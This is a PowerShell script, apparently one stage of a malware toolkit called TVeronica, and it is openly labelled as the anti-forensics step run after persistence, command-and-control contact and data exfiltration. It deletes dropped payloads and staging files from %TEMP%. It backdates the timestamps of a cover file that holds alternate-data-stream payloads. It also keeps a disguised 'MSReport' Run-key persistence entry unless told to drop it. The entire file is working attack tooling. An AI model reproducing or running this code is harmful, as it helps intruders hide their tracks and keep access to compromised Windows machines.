# cleanup.ps1 - TVeronica Stage 6: ANTI-FORENSICS
#
# Trigger (per kill chain): persistence OK + C2 ACK + exfil OK - operator runs this last.
#   1. delete %TEMP% staging artifacts (dropped scripts, logs, packages, probe markers)
#   2. timestomp report.log (ADS carrier cover file)
#   3. KEEP persistence (Run key + ADS payloads) unless -DropPersistence
#

param(
    [switch]$DropPersistence,
    [switch]$DryRun
)

$ErrorActionPreference = 'SilentlyContinue'

function Log([string]$m) { Write-Host $m }

# ---------------- 1. TEMP artifacts ----------------
$patterns = @('killing.ps1', 'update.js', 'update.log', 'stage2.zip', 'tveronica_probe', 'raw.js', 'stage3.ps1', 'killing.log')

Get-ChildItem -Path $env:TEMP -Directory -EA SilentlyContinue |
    Where-Object { $_.Name -match '^[a-z0-9]{10}$' } |
    ForEach-Object {
        $hit = Get-ChildItem $_.FullName -File -EA SilentlyContinue |
            Where-Object { $patterns -contains $_.Name } |
            Select-Object -First 1
        if ($hit) {
            if ($DryRun) { Log ('[dry] remove dir : ' + $_.FullName) }
            else {
                Remove-Item $_.FullName -Recurse -Force -EA SilentlyContinue
                Log ('[+] removed dir : ' + $_.Name)
            }
        }
    }

Get-ChildItem -Path $env:TEMP -File -EA SilentlyContinue |
    Where-Object { ($patterns -contains $_.Name) -or ($_.Name -like 'tver_*_ok.txt') } |
    ForEach-Object {
        if ($DryRun) { Log ('[dry] remove file: ' + $_.Name) }
        else {
            Remove-Item $_.FullName -Force -EA SilentlyContinue
            Log ('[+] removed file: ' + $_.Name)
        }
    }

# ---------------- 2. timestomp ----------------
$repLog = Join-Path (Join-Path $env:APPDATA 'MSReport') 'report.log'
if (Test-Path $repLog) {
    $t = Get-Date '2020-01-01T08:00:00'
    if ($DryRun) { Log '[dry] timestomp report.log -> 2020-01-01 08:00' }
    else {
        [IO.File]::SetCreationTime($repLog, $t)
        [IO.File]::SetLastAccessTime($repLog, $t)
        [IO.File]::SetLastWriteTime($repLog, $t)
        Log '[+] timestomp report.log -> 2020-01-01 08:00'
    }
} else {
    Log '[!] report.log not found (nothing to stomp)'
}

# ---------------- 3. persistence state ----------------
$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
if ($DropPersistence) {
    if ($DryRun) { Log '[dry] drop Run key MSReport' }
    else {
        Remove-ItemProperty -Path $runKey -Name 'MSReport' -Force -EA SilentlyContinue
        Log '[+] persistence dropped (Run key removed)'
    }
} else {
    $v = (Get-ItemProperty -Path $runKey -Name 'MSReport' -EA SilentlyContinue).MSReport
    if ($v) { Log ('[+] persistence kept: ' + $v) }
    else    { Log '[!] Run key MSReport missing' }
}

Log '[+] stage6 cleanup complete'
exit 0
